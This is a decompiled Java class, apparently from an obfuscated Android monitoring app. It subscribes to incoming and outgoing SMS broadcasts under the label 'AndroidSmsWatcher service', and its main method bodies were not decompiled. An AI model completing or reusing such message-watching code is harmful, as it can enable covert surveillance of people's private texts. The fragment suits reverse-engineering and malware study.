package com.network.android.monitor.observer;

import android.database.ContentObserver;
import android.os.Handler;
import com.network.e.a.a;

public final class n extends r {

    /* renamed from: a  reason: collision with root package name */
    private static final String[] f99a = {"android.provider.Telephony.SMS_RECEIVED", "android.provider.Telephony.NEW_OUTGOING_SMS"};
    private ContentObserver b;
    private Handler e = new Handler();
    private String f = null;

    /* JADX WARNING: Removed duplicated region for block: B:41:0x0201  */
    /* JADX WARNING: Removed duplicated region for block: B:54:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    static /* synthetic */ void a(com.network.android.monitor.observer.n r11, android.content.Context r12) {
        /*
        // Method dump skipped, instructions count: 529
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.monitor.observer.n.a(com.network.android.monitor.observer.n, android.content.Context):void");
    }

    /* JADX WARNING: Removed duplicated region for block: B:41:0x0154 A[SYNTHETIC, Splitter:B:41:0x0154] */
    /* JADX WARNING: Removed duplicated region for block: B:49:0x0175 A[SYNTHETIC, Splitter:B:49:0x0175] */
    @Override // com.network.android.monitor.a.d
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final void a(com.network.android.monitor.a.a r11) {
        /*
        // Method dump skipped, instructions count: 430
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.monitor.observer.n.a(com.network.android.monitor.a.a):void");
    }

    @Override // com.network.android.monitor.observer.r
    public final void a(a aVar) {
        com.network.android.c.a.a.a("AndroidSmsWatcher service");
    }

    @Override // com.network.android.monitor.observer.r
    public final String[] a() {
        return f99a;
    }
}
